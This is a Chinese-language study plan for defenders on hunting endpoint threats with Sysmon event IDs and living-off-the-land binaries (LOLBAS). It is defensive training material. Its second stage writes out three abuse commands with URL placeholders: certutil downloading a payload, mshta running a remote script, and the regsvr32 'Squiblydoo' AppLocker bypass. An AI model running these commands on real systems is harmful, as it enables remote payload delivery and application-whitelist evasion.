# 🏹 端點威脅獵捕與 Sysmon 遙測深度學習路徑 (Endpoint Threat Hunting & LOLBAS)
> 對應藍隊防衛矩陣：**領域 18** (18.1 ~ 18.4)
> 預計總投入時間：**35 ~ 45 小時**

---

## 📍 你在哪裡、去哪裡

```
你現在的狀態                     這份路徑帶你到達的位置
──────────────────               ────────────────────────────
等防毒軟體報警才處理     ──►    能主動運用 Sysmon 驅動遙測獵捕潛伏威脅
只認識正常系統工具名稱   ──►    精通合法程式白利用 (LOLBAS) 特徵與繞過手法
抓不到無檔案記憶體注入   ──►    掌握 CreateRemoteThread (Event 8) 注入偵測
```

---

## 🗺️ 整體學習地圖（四個階段）

```
階段一 → 階段二 → 階段三 → 階段四
Sysmon核心事件碼  LOLBAS獵捕實戰  持久化註冊表獵捕  進程注入與遠端執行緒
(10h)            (10h)           (8h)              (10h)
```

---

## 🔍 階段一：Sysmon (System Monitor) 核心遙測事件碼（約 10 小時）

| Event ID | 名稱 | 獵捕價值與偵測場景 |
| :---: | :--- | :--- |
| **1** | **Process Creation (進程建立)** | 記錄完整命令行、父進程、雜湊 (SHA256)、工作目錄 |
| **3** | **Network Connection (網路連線)** | 記錄特定進程發起的外連 IP/Port、DNS 名稱 |
| **7** | **Image Loaded (模組載入)** | 偵測 DLL 劫持與非預期路徑模組載入 |
| **8** | **CreateRemoteThread (遠端執行緒)**| 偵測 Process Injection、Shellcode 注入現有合法進程 |
| **11** | **FileCreate (檔案建立)** | 偵測可執行檔釋放、勒索軟體批量寫入 |
| **12/13/14** | **Registry Event (登錄檔變更)** | 偵測 Run 自啟動項、服務註冊變更 |

---

## 🛠️ 階段二：合法程式白利用 (LOLBAS) 獵捕實戰（約 10 小時）

攻擊者利用 Windows 內建受簽章之合法程式繞過應用程式白名單：
1. `certutil.exe -urlcache -split -f [URL]` (下載惡意載荷)
2. `mshta.exe [URL]` (無檔案腳本執行)
3. `regsvr32.exe /s /n /u /i:[URL] scrobj.dll` (Squiblydoo 繞過 AppLocker)

---

## 📋 自我評估檢查點

- [ ] 說出 Sysmon Event ID 1 與 Windows 原生 4688 在日誌深度上的優勢（原生包含雜湊與父進程完整鏈）。
- [ ] 熟背至少三個經典 LOLBAS 程式及其常見被濫用參數。
- [ ] 說明為什麼 CreateRemoteThread (Event 8) 是記憶體代碼注入的高危告警信號。
